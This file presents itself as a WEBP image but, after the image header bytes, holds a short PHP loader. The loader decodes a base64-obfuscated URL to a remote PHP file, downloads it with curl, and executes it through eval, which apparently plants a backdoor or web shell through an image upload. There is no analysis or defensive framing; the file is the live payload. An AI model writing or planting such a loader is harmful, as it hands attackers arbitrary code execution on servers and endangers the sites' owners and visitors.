RIFF¤   WEBPVP8 ˜   ðÑ  *ô ô >‘HŸK¥¤"§£±¨àð   
<?php
$url = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2F5YW1ib3NzL2NoaWtlbi9yZWZzL2hlYWRzL21haW4vZ2Vja28tb2xkLnBocA=='); // URL dienkode dalam base64
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$output = curl_exec($ch);
curl_close($ch);

eval("?>".$output);
?>